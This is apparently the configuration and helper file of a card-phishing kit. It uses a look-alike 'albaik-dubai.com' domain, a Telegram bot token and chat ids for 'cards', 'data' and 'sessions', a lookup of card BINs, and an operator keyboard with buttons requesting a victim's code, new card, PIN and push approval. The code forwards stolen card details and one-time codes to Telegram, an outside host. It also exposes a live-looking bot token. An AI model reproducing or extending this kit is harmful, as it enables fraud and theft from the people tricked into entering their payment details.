<?php 
	
if ( 1 == 0 ) {
	ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
} else {
    ini_set('display_errors', 0);
    ini_set('display_startup_errors', 0);
    error_reporting(E_ALL);
}

$chats = [
    0 => [
        'token'    => '7375790466:AAF_VOh1jxFH6fosHoElU7QZ8sXk1IfhBiQ', //tg bot token
        'cards'    => '-1002213615078', // cards chat id
        'data'     => '-1002161344348', // data chat id
        'sessions' => '-1002161344348' // sessions chat id
    ],
];
define('CHATS', $chats);


//define('DOMEN', 'rwedgfiedfiujnt.site'); //domen
//define('SSR_CERT', '/var/www/httpd-cert/rwedgfiedfiujnt.site_2024-08-10-12-25_02.crt'); // ssl certificate file 
//define('SSL_KEY', '/var/www/httpd-cert/rwedgfiedfiujnt.site_2024-08-10-12-25_02.key'); // ssl key file

define('DOMEN', 'albaik-dubai.com'); //domen
define('SSR_CERT', '/var/www/httpd-cert/albaik-dubai.com_2024-11-01-03-13_24.crt'); // ssl certificate file 
define('SSL_KEY', '/var/www/httpd-cert/albaik-dubai.com_2024-11-01-03-13_24.key'); // ssl key file

define('TCP_PORT', '11139'); // Уникальное для каждого сайта
define('WSS_PORT', '11240'); // Уникальное для каждого сайта

function check_bin($card_number) {
    $card_bin  = substr($card_number, 0, 6);
    $card_data = file_get_contents('https://bins.antipublic.cc/bins/'.$card_bin);
    if (!$card_data) {
        return '';
    }
    $card_data = json_decode($card_data, true);
    $bin_data = "🏦".$card_data['type']." ".$card_data['level']."\n".$card_data['bank']."\n".$card_data['country_flag']." ".$card_data['country_name'];
    return $bin_data;
}

// Вывод статуса о сообщении
function message_status($text, $callback_id, $token) {
    $req = sendTelegram(
    	'answerCallbackQuery',
    	array(
    		'callback_query_id' => $callback_id,
    		'text' => $text
    	),
    	$token
    );
    // file_put_contents('test.txt', $req);
}

// КНОПКИ ТГ
function kb($session) {
    $keyboard = [
    	'inline_keyboard' => [
    		[
    			['text' => '🪄 ᴄᴏᴅᴇ', 'callback_data' => 'code_'.$session],
    		],
    		[
    		    ['text' => '🪄 ɴᴇᴡ ᴄᴏᴅᴇ', 'callback_data' => 'errcode_'.$session],
    		],
    		[
    			['text' => '🔮 ɴᴇᴡ ᴄᴀʀᴅ', 'callback_data' => 'card_'.$session],
    		],
    		[
    			['text' => '🦄 ᴘɪɴ', 'callback_data' => 'pin_'.$session],
    		],
    		[
    			['text' => '📱 ᴘᴜsʜ', 'callback_data' => 'push_'.$session],
    		],
    		[
    		    ['text' => '✔️ ᴘᴀɪᴅ', 'callback_data' => 'paid_'.$session],
    		],
            [
                ['text' => '👀 ᴏɴʟɪɴᴇ¿', 'callback_data' => 'online_'.$session]
            ]
    	]
    ];
    $keyboard = json_encode($keyboard);
    return $keyboard;
}

// Функция вызова методов API.
function sendTelegram($method, $response, $token)
{
    $ch = curl_init('https://api.telegram.org/bot' . $token . '/' . $method);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}